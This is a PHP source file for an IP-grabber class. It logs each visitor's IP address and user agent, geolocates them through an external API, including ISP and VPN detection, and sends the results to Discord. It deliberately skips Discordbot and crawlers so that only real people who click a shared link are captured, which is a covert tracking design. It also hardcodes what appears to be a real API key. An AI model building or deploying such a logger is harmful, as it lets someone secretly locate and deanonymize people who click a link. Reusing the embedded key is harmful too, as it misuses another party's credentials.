<?php

require_once 'Discord.php'; // Ensure this path is correct

class IpLogger {
    public function write($filename, $timezone) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];

        // Check if the user agent is a known bot or web crawler or Discord
        if ($this->isBot($userAgent) || $this->isDiscordUserAgent($userAgent)) {
            // Skip logging if it's a bot, web crawler, or Discord user agent
            return;
        }

        // Get IP geolocation data
        $geoData = $this->getIpGeoData($ip);

        if ($geoData === null) {
            // If we can't get geolocation data, log an error and return
            error_log("Failed to retrieve geolocation data for IP: $ip");
            return;
        }

        $timestamp = (new DateTime('now', new DateTimeZone($timezone)))->format('Y-m-d H:i:s');
        $logEntry = "$timestamp - IP: $ip - User Agent: $userAgent\n";

        if ($file = fopen($filename, 'a')) {
            fwrite($file, $logEntry);
            fclose($file);
        } else {
            error_log("Failed to open file for writing: $filename");
        }

        // Send data to Discord
        $discord = new Discord();
        $response = $discord->sendIpToDiscord($ip, $userAgent, $geoData);
        if ($response === false) {
            error_log("Failed to send data to Discord");
        }
    }

    private function getIpGeoData($ip) {
        $apiKey = 'c3ff1ab93dd84d8f991646bd33e2bbf8'; // Replace with your ipgeolocation.io API key
        $url = "https://api.ipgeolocation.io/ipgeo?apiKey=$apiKey&ip=$ip";

        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        curl_close($curl);

        if ($response === false) {
            error_log("Failed to retrieve coordinates for IP: $ip");
            return null;
        }

        $data = json_decode($response, true);

        if (isset($data['latitude']) && isset($data['longitude'])) {
            return [
                'latitude' => $data['latitude'],
                'longitude' => $data['longitude'],
                'is_vpn' => $data['is_vpn'] ?? false, // Optional field for VPN detection
                'isp' => $data['isp'] ?? 'Unknown'
            ];
        } else {
            error_log("Invalid response from IP Geolocation API for IP: $ip");
            return null;
        }
    }

    private function isBot($userAgent) {
        $bots = [
            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
            'yandexbot', 'sogou', 'exabot', 'facebot', 'facebookexternalhit'
        ];

        foreach ($bots as $bot) {
            if (stripos($userAgent, $bot) !== false) {
                return true;
            }
        }

        return false;
    }

    private function isDiscordUserAgent($userAgent) {
        // Simple check for Discord user agent
        return stripos($userAgent, 'Discordbot') !== false;
    }
}

?>
